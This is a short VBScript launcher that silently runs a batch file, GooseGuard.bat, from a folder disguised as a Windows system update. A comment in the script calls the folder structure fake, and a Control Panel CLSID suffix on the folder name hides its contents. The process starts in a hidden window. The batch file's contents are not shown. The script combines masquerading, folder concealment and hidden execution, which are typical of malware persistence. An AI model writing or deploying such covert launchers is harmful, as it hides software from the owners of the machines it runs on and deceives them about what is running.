Set WshShell = CreateObject("WScript.Shell")
' Path matches the fake folder structure
path = "C:\ProgramData\SystemUpdate.{21EC2020-3AEA-1069-A2DD-08002B30309D}\WinServiceUpdate\WinServiceUpdate\SourceFiles\GooseGuard.bat"
' 0 = Hidden, False = Don't wait for the process to finish
WshShell.Run """" & path & """", 0, False
Set WshShell = Nothing